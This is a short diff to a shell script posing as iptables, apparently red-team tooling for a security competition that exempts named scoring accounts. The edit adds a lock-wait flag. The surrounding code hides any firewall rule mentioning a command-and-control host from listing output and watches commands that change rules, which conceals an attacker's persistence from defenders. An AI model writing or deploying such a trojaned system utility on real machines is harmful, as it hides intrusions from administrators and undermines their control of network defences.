@@ -7,7 +7,7 @@ fi
 
 # Pass straight through for gray team scoring accounts
 case "$(whoami)" in
-    kingneptune|paintythepirate|greyteamadmin) exec $REAL_IPTABLES "$@" ;;
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_IPTABLES -w 5 "$@" ;;
 esac
 
 
@@ -54,11 +54,11 @@ for arg in "$@"; do
 done
 
 if [ "$IS_LIST" -eq 1 ]; then
-    $REAL_IPTABLES "$@" 2>&1 | grep -v "$C2_HOST"
+    $REAL_IPTABLES -w 5 "$@" 2>&1 | grep -v "$C2_HOST"
     exit ${PIPESTATUS[0]}
 fi
 
-$REAL_IPTABLES "$@"
+$REAL_IPTABLES -w 5 "$@"
 RC=$?
 
 if [ "$MUTATING" -eq 1 ]; then
